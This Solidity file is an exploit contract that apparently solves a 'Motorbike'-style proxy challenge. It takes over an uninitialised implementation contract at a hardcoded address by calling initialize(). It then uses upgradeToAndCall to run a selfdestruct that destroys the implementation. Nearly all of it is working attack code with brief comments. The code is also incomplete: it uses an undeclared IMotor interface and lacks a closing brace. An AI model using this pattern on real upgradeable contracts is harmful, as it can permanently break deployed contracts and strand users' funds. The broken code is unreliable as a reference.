// SPDX-License-Identifier: MIT


pragma solidity ^0.6.0;



interface IEngine {
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
    function initialize() external;
}

contract SelfDestruct {
    function explode() public {
        selfdestruct(payable(address(tx.origin)));
    }
}

contract AttackMotor {
    IMotor motor;
    IEngine engine;
    SelfDestruct selfDestruct;

    constructor() public{
        // motor = IMotor(_motor);
        engine = IEngine(0x5fc6f20F8816A8d5f560234b1adde1d7C5420AB8);
        selfDestruct = new SelfDestruct();
    }

    function attackMotor() public payable {
        // bytes memory data = abi.encodeWithSignature("initialize()");
        bytes memory data = abi.encodeWithSignature("explode()");
        // bytes32 dataHash = keccak256(data);
        // motor.sumFunction{value: 0}(dataHash);
        engine.initialize();
        engine.upgradeToAndCall(address(selfDestruct), data);
    }


//call upgrade and call through the fallback function
//contract that has selfdestruct function, call it in data
